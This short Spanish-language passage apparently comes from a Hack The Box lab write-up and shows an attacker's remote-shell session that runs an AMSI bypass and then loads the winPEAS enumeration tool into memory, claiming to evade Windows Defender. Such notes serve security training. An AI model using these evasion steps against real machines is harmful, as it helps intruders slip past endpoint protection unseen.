@@ -1,0 +1,26 @@
+[*] Tendremos que ejecutar el siguiente comando.
+
+  > menu
+
+  [+] Output:
+    [+] Dll-Loader 
+    [+] Donut-Loader 
+    [+] Invoke-Binary
+    [+] Bypass-4MSI
+    [+] services
+    [+] upload
+    [+] download
+    [+] menu  
+    [+] exit
+
+[*] Para hacer que el programa se inyecte directamente en memoria tendremos que hacer lo siguiente
+
+  > Bypass-4MSI
+
+  [+] Output:
+    [+] Success!
+
+  
+  > Invoke-Binary /home/<USER>/htb/APT/content/winpeas.exe
+
+[+] Con esto ya bypaseamos el defender 
